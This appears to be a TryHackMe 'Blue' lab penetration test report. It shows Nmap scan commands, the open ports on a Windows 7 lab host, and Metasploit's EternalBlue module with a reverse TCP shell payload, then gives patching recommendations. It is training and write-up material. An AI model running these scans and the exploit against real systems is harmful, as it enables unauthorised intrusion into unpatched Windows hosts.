
# Penetration Test Report – Lab Blue
 
**Tools Used:** Nmap, Metasploit

---

## ❓ Objective

Conduct a penetration test against the TryHackMe Lab Blue machine to identify open ports, determine service versions, check for known vulnerabilities, and exploit any identified weaknesses.

---

## 🕵 Reconnaissance

### Nmap Full Port Scan and Service Enumeration

**Command Used:**
```bash
db_nmap -sS -sV -T4 -p- -Pn 10.10.78.176 -vv
```

**Findings:**

| Port     | State | Service        | Version                              |
|----------|-------|----------------|--------------------------------------|
| 135/tcp  | open  | msrpc          | Microsoft Windows RPC                |
| 139/tcp  | open  | netbios-ssn    | Microsoft Windows netbios-ssn       |
| 445/tcp  | open  | microsoft-ds   | Windows 7 - 10 (Workgroup: WORKGROUP)|
| 3389/tcp | open  | tcpwrapped     | -                                    |
| 49152/tcp| open  | msrpc          | Microsoft Windows RPC                |
| 49153/tcp| open  | msrpc          | Microsoft Windows RPC                |
| 49154/tcp| open  | msrpc          | Microsoft Windows RPC                |
| 49158/tcp| open  | msrpc          | Microsoft Windows RPC                |
| 49159/tcp| open  | msrpc          | Microsoft Windows RPC                |

**OS Identified:** Windows 7 Professional SP1 x64  
**Hostname:** JON-PC  
**CPE:** cpe:/o:microsoft:windows

---

## 🔎 Vulnerability Scanning

**Command Used:**
```bash
db_nmap -sV --script vulners 10.10.78.176
```

**Vulnerabilities Identified:**

| Vulnerability             | Description                        | References                                                                                 |
|---------------------------|------------------------------------|--------------------------------------------------------------------------------------------|
| SMB Signing Not Required  | Allows man-in-the-middle attacks   | [MS KB161372](https://support.microsoft.com/help/161372), [MS KB887429](https://support.microsoft.com/help/887429) |

---

## 🛠️ Exploitation

### Exploit Used:
```bash
exploit/windows/smb/ms17_010_eternalblue
```

**Payload:**
```bash
set payload windows/x64/shell/reverse_tcp
```

**Results:**

- Target confirmed vulnerable to **MS17-010** (EternalBlue)
- Successfully exploited the target
- Gained Meterpreter session:
  - IP: 10.10.78.176
  - Session Opened: 2025-05-02 10:34:56 +0100
- Output:
  ```
  [+] 10.10.78.176:445 - WIN
  ```

---

## 👀 Post-Exploitation

- Initial shell was upgraded to Meterpreter
- System access was achieved through kernel exploit
- Gained remote code execution on target system

---

## ✅ Conclusion

The target machine was successfully compromised using the **MS17-010 EternalBlue** vulnerability, highlighting critical unpatched services running on the system. SMB Signing was also found to be disabled, further weakening the network posture.

**Recommendations:**

- Apply all critical Windows security updates
- Enable SMB Signing on all systems
- Monitor and restrict access to RPC and SMB services
- Implement host-based firewalls to block unnecessary inbound connections

---
